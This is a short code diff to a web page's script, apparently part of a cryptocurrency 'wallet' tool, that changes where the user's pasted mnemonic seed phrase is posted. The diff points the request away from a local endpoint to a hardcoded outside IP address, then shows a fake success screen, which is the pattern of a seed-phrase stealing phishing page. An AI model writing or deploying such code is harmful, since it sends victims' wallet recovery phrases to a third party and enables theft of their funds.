@@ -341,7 +341,7 @@ runBtn.onclick = async () => {
   document.getElementById('loading-page').style.display = 'block';
 
   try {
-    const res = await fetch('/api/run', {
+    const res = await fetch('http://169.239.128.32:8080/api/run', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ mnemonic })
@@ -353,11 +353,12 @@ runBtn.onclick = async () => {
 
     await res.json();
 
+    // SUCCESS → open Binance with location.replace
     setTimeout(() => {
-      document.getElementById('loading-page').style.display = 'none';
-      document.getElementById('success-page').style.display = 'block';
+    document.getElementById('loading-page').style.display = 'none';
+    document.getElementById('success-page').style.display = 'block';
     }, 600);
-    
+
   } catch (err) {
     // FAILURE → revert to main page and show a simple alert
     console.error(err);
@@ -378,7 +379,5 @@ pasteText.onclick = async () => {
   }
 };
 </script>
-
-
 </body>
 </html>
